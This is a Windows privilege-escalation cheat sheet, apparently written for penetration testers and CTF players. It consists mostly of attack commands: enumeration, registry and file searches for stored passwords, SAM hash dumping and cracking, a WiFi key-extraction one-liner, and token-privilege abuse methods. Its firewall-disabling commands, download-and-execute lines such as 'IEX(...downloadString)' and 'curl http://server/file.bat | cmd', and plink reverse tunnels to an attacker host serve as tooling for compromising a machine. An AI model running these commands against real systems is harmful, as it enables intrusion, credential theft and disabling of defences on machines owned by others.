# Windows Privilege Escalation

Privilege escalation always comes down to proper enumeration. But to accomplish proper enumeration you need to know what to check and look for. This takes familiarity with systems that normally comes along with experience. At first privilege escalation can seem like a daunting task, but after a while, you start to filter through what is normal and what isn’t. It eventually becomes easier to know what to look for rather than digging through everything hoping to find that needle in the haystack. Hopefully, this guide will provide a good foundation to build upon and get you started.

**Note:** I am not an expert and still learning myself.

#### Guide Layout

In each section, I first provide the old trusted CMD commands and then also a Powershell equivalent for posterity's sake. It’s good to have both tools under your belt and Powershell is much more versatile for scripting than the traditional CMD. However there isn’t a Powershell equivalent for everything \(or CMD is still simply easier/better on certain things\), so some sections will only contain regular CMD commands.

## Operating System

What is the OS and architecture? Is it missing any patches?

```text
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic qfe
```

Architecture

```text
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
```

Is there anything interesting in environment variables? A domain controller in `LOGONSERVER`?

```text
set
```

```text
Get-ChildItem Env: | ft Key,Value
```

Are there any other connected drives?

List ****all drives

```text
net use
wmic logicaldisk get caption,description,providername
```

```text
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## Users

Who are you?

```text
whoami
echo %USERNAME%
```

```text
$env:UserName
```

Any interesting user privileges? _Note: The State column does not mean that the user does or does not have access to this privilege. If the privilege is listed, then that user has it._

```text
whoami /priv
```

What users are on the system? Any old user profiles that weren’t cleaned up?

```text
net users
net user
whoami /all
dir /b /ad "C:\Users\"
dir /b /ad "C:\Documents and Settings\" # Windows XP and below
```

```text
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
```

List logon requirements; useable for brute-forcing

```text
net accounts
```

Is anyone else logged in?

```text
qwinsta
```

What groups are on the system?

```text
net localgroup
```

```text
Get-LocalGroup | ft Name
```

Are any of the users in the Administrator group?

```text
net localgroup Administrators
```

```text
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

Anything in the Registry for User Autologin?

```text
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
```

```text
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
```

Anything interesting in Credential Manager?

```text
cmdkey /list
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

```text
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Can we access SAM and SYSTEM files?

```text
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

## Token Manipulation

Take a look at **available privileges**, some of them can give you SYSTEM privileges. Take a look at [this amazing paper](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt).

### SeImpersonatePrivilege \(3.1\)

Any process holding this privilege can **impersonate** \(but not create\) any **token** for which it is able to gethandle. You can get a **privileged token** from a **Windows service** \(DCOM\) making it perform an **NTLM authentication** against the exploit, then execute a process as **SYSTEM**. Exploit it with [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM ](https://github.com/antonioCoco/RogueWinRM)\(needs winrm enabled\), [SweetPotato](https://github.com/CCob/SweetPotato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

### SeAssignPrimaryPrivilege \(3.2\)

It is very similar to **SeImpersonatePrivilege**, it will use the **same method** to get a privileged token.  
Then, this privilege allows us **to assign a primary token** to a new/suspended process. With the privileged impersonation token, you can derivate a primary token \(DuplicateTokenEx\).

With the token, you can create a **new process** with 'CreateProcessAsUser' or create a process suspended and **set the token** \(in general, you cannot modify the primary token of a running process\).

### SeTcbPrivilege \(3.3\)

If you have enabled this token you can use **KERB\_S4U\_LOGON** to get an **impersonation token** for any other user without knowing the credentials, **add an arbitrary group** \(admins\) to the token, set the **integrity level** of the token to "**medium**", and assign this token to the **current thread** \(SetThreadToken\).

### SeBackupPrivilege \(3.4\)

This privilege causes the system to **grant all read access** control to any file \(only read\).

Use it to **read the password hashes of local Administrator** accounts from the registry and then use "**psexec**" or "**wmicexec**" with the hash \(PTH\).

This attack won't work if the Local Administrator is disabled, or if it is configured that a Local Admin isn't admin if he is connected remotely.

You can **abuse this privilege** with

* [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
* [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)..

### SeRestorePrivilege \(3.5\)

**Write access** control to any file on the system, regardless of the files ACL.

You can **modify services**, DLL Hijacking, set **debugger** \(Image File Execution Options\)… A lot of options to escalate.

### SeCreateTokenPrivilege \(3.6\)

This token **can be used** as EoP method **only** if the user **can impersonate** tokens \(even without SeImpersonatePrivilege\).

In a possible scenario, a user can impersonate the token if it is for the same user and the integrity level is less or equal to the current process integrity level.

In this case, the user could **create an impersonation token** and add to it a privileged group SID.

### SeLoadDriverPrivilege \(3.7\)

**Load and unload device drivers.**

You need to create an entry in the registry with values for ImagePath and Type.

As you don't have access to write to HKLM, you have to **use HKCU**. But HKCU doesn't mean anything for the kernel, the way to guide the kernel here and use the expected path for a driver config is to use the path: "\Registry\User\S-1-5-21-582075628-3447520101-2530640108-1003\System\CurrentControlSet\Services\DriverName" \(the ID is the **RID** of the current user\).

So, you have to **create all that path inside HKCU and set the ImagePath** \(path to the binary that is going to be executed\) **and Type** \(SERVICE\_KERNEL\_DRIVER 0x00000001\).

### SeTakeOwnershipPrivilege **\(3.8\)**

This privilege is very similar to **SeRestorePrivilege**.

It allows a process to “**take ownership of an object** without being granted discretionary access” by granting the WRITE\_OWNER access right.

First, you have to **take ownership of the registry key** that you are going to write on and **modify the DACL** so you can write on it.

### SeDebugPrivilege \(3.9\)

It allows the holder to **debug another process**, this includes reading and **writing** to that **process's memory.**  
There are a lot of various **memory injection** strategies that can be used with this privilege that evade a majority of AV/HIPS solutions.

### Check Privileges

```text
whoami /priv
```

## Programs, Processes, and Services

What software is installed?

```text
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE
```

```text
Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime

Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

Is there any weak folder or file permissions?

Full Permissions for Everyone or Users on Program Folders?

```text
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"

icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" 
```

Modify Permissions for Everyone or Users on Program Folders?

```text
icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone"

icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
```

```text
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} 

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}} 
```

You can also upload accesschk from Sysinternals to check for writeable folders and files.

```text
accesschk.exe -qwsu "Everyone" *
accesschk.exe -qwsu "Authenticated Users" *
accesschk.exe -qwsu "Users" *
```

What are the running processes/services on the system? Is there an inside service not exposed? If so, can we open it? _See Port Forwarding in Appendix._

```text
tasklist /svc
tasklist /v
net start
sc query
```

_`Get-Process` has a `-IncludeUserName` option to see the process owner, however, you have to have administrative rights to use it._

```text
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
Get-Service
```

_This one-liner returns the process owner without admin rights, if something is blank under owner it’s probably running as SYSTEM, NETWORK SERVICE, or LOCAL SERVICE._

```text
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
```

Any weak service permissions? Can we reconfigure anything? Again, upload accesschk.

```text
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *
```

Are there any unquoted service paths?

```text
wmic service get name,displayname,pathname,startmode 2>nul |findstr /i "Auto" 2>nul |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """
```

```text
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

What scheduled tasks are there? Anything custom implemented?

```text
schtasks /query /fo LIST 2>nul | findstr TaskName
dir C:\windows\tasks
```

```text
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

What is ran at startup?

```text
wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
```

```text
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```

Is AlwaysInstallElevated enabled? _I have not ran across this but it doesn’t hurt to check._

```text
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## Networking

What NICs are connected? Are there multiple networks?

```text
ipconfig /all
```

```text
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

What routes do we have?

```text
route print
```

```text
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

Anything in the ARP cache?

```text
arp -a
```

```text
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```

Are there connections to other hosts?

```text
netstat -ano
```

Anything in the host's file?

```text
C:\WINDOWS\System32\drivers\etc\hosts
```

Is the firewall turned on? If so what’s configured?

```text
netsh firewall show state
netsh firewall show config
netsh advfirewall firewall show rule name=all
netsh advfirewall export "firewall.txt"
```

Disable firewall

```text
netsh firewall set opmode disable
netsh advfirewall set allprofiles state off
```

List all network shares

```text
net share
```

Any other interesting interface configurations?

```text
netsh dump
```

Are there any SNMP configurations? 

```text
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
```

```text
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```

## Interesting Files and Sensitive Information

This section may be a little noisy so you may want to output commands into txt files to review and parse as you wish.

**Any passwords in the registry?**

```text
reg query HKCU /f password /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s 
```

Generate a hash file for John using `pwdump` or `samdump2`.

```text
pwdump SYSTEM SAM
samdump2 SYSTEM SAM -o sam.txt
```

Then crack it with `john -format=NT sam.txt`.

**Search File Contents**

Is their sysprep or unattended files available that weren’t cleaned up?

```text
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Search For A File With A Certain Filename**

```text
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

```
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

```text
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

**If the server is an IIS webserver, what’s in inetpub? Any hidden directories? web.config files?**

```text
dir /a C:\inetpub\
dir /s web.config
C:\Windows\System32\inetsrv\config\applicationHost.config
```

```text
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

**What’s in the IIS Logs?**

```text
C:\inetpub\logs\LogFiles\W3SVC1\u_ex[YYMMDD].log
C:\inetpub\logs\LogFiles\W3SVC2\u_ex[YYMMDD].log
C:\inetpub\logs\LogFiles\FTPSVC1\u_ex[YYMMDD].log
C:\inetpub\logs\LogFiles\FTPSVC2\u_ex[YYMMDD].log
```

**Is XAMPP, Apache, or PHP installed? Any there any XAMPP, Apache, or PHP configuration files?**

```text
dir /s php.ini httpd.conf httpd-xampp.conf my.ini my.cnf
```

```text
Get-Childitem –Path C:\ -Include php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -ErrorAction SilentlyContinue
```

**Any Apache weblogs?**

```text
dir /s access.log error.log
```

```text
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

**Any interesting files to look at? Possibly inside User directories \(Desktop, Documents, etc\)?**

```text
dir /s *pass* == *vnc* == *.config* 2>nul
```

```text
Get-Childitem –Path C:\Users\ -Include *password*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue
```

#### Search the registry for key names and passwords

```text
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

#### Read a value of a certain sub key

```text
REG QUERY "HKLM\Software\Microsoft\FTH" /V RuleList
```

**Files containing password**s **inside them?**

```text
findstr /si password *.xml *.ini *.txt *.config 2>nul
```

```text
Get-ChildItem C:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"
```

#### WiFi Passwords

```text
netsh wlan show profile
netsh wlan show profile <SSID> key=clear
```

Oneliner method to extract wifi passwords from all the access point.

```text
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```

#### Passwords Stored In Services

Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using [SessionGopher](https://github.com/Arvanaghi/SessionGopher)

```text
https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

#### Powershell History

```text
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

## Enumeration Script

I’ve created a Powershell script which pretty much automates all of the above. You can check it out [here](https://github.com/absolomb/WindowsEnum).

## Transferring Files

At some point during privilege escalation, you will need to get files onto your target. Below are some easy ways to do so.

**PowerShell Cmdlet \(Powershell 3.0 and higher\)**

```text
Invoke-WebRequest "https://server/filename" -OutFile "C:\Windows\Temp\filename"
```

**PowerShell One-Liner**

```text
(New-Object System.Net.WebClient).DownloadFile("https://server/filename", "C:\Windows\Temp\filename") 
```

OR

```text
powershell.exe -exec bypass -Command (New-Object System.Net.WebClient).DownloadFile('https://server/filename', 'C:\Windows\Temp\filename')
```

**PowerShell One-Line Script Execution in Memory**

```text
IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')
```

**PowerShell with Proxy**

```text
$browser = New-Object System.Net.WebClient;
$browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
IEX($browser.DownloadString('https://server/script.ps1'));
```

**PowerShell Script**

```text
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://server/file.exe" >>wget.ps1
echo $file = "output-file.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
		
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

Non-interactive FTP via text file. _Useful for when you only have limited command execution._

```text
echo open 10.10.10.11 21> ftp.txt
echo USER username>> ftp.txt
echo mypassword>> ftp.txt
echo bin>> ftp.txt
echo GET filename>> ftp.txt
echo bye>> ftp.txt
		
ftp -v -n -s:ftp.txt
```

**CertUtil**

```text
certutil.exe -urlcache -split -f https://myserver/filename outputfilename
```

**Certutil can also be used for base64 encoding/decoding.**

```text
certutil.exe -encode inputFileName encodedOutputFileName
certutil.exe -decode encodedInputFileName decodedOutputFileName
```

Starting with Windows 10 1803 \(April 2018 Update\) the `curl` command has been implemented which gives another way to transfer files and even execute them in memory. _Piping directly into cmd will run most things but it seems like if you have anything other than regular commands in your script, ie loops, if statements etc, it doesn’t run them correctly._

```text
curl http://server/file -o file
curl http://server/file.bat | cmd
```

**And with PowerShell**

```text
IEX(curl http://server/script.ps1);Invoke-Blah
```

## Port Forwarding

This is useful for exposing inside services that aren’t available from outside the machine, normally due to firewall settings.

Upload `plink.exe` to target.

Start SSH on your attacking machine.

**For example to expose SMB, on the target run:**

```text
plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
```

As of Windows 10 1803 \(April 2018 Update\), ssh client is now included and turned on by default! So you’re able to use ssh to do port forwarding right out of the box now.

```text
ssh -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
```

## Local File Inclusion List

This is not an exhaustive list, installation directories will vary, I’ve only listed common ones.

```text
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini 
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```

